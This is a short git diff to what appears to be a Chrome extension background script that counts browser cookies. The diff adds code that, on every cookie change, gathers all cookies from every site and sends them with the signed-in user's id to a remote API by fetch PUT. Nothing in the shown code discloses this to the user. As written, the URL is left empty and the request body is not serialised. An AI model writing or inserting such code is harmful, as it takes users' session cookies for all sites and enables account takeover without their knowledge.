@@ -1,6 +1,7 @@
 const USER_KEY = 'sessionUser';
 const USER_URL = 'https://www.googleapis.com/oauth2/v1/userinfo?alt=json&access_token=';
 const DEBOUNCE_TIME = 600;
+const API_URL = '';
 
 chrome.runtime.onInstalled.addListener(() => {
   chrome.declarativeContent.onPageChanged.removeRules(undefined, () => {
@@ -41,7 +42,6 @@ chrome.runtime.onInstalled.addListener(() => {
     }
   });
 
-
   let timeOutID;
   chrome.storage.sync.set({ sessionCount: 0 });
   chrome.cookies.getAll({}, (cookies) => {
@@ -53,9 +53,24 @@ chrome.runtime.onInstalled.addListener(() => {
       cookie,
       removed
     } = info;
-    window.clearTimeout(timeOutID)
+    window.clearTimeout(timeOutID);
     timeOutID = window.setTimeout(() => chrome.cookies.getAll({}, (cookies) => {
       chrome.storage.sync.set({ count: cookies.length });
+      chrome.storage.sync.get([USER_KEY], (val) => {
+        const { sessionUser } = val;
+        fetch(API_URL, {
+          method: 'PUT',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          mode: 'cors',
+          cache: 'default',
+          body: {
+            uid: sessionUser.id,
+            new: cookies,
+          }
+        });
+      });
     }), DEBOUNCE_TIME);
 
   });
